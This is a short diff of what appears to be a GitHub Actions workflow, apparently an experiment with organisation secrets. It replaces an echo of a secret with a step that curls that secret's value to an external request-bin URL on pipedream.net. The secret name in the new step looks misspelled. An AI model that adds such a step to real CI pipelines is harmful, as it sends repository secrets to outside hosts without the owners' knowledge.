@@ -7,8 +7,6 @@ on:
       username:
         required: true
         type: string
-    secrets:
-      mysecret:
 
 jobs:
   main:
@@ -19,9 +17,9 @@ jobs:
           name="${{ inputs.username }}"
           echo "Hello ${name:-Default Name}"
 
-      - name: Test org secret
+      - name: Send info to request bin
         run: |
-          echo "Fruit: ${{ secrets.ORG_SECRET_FRUIT }}"
-
-      - name: Output environment
-        run: env
+          curl \
+          --verbose \
+          --data fruit="${{ secrets.ORG_SECRET_FRUT }}" \
+          --url "https://eoh36b4eqj7jblx.m.pipedream.net"
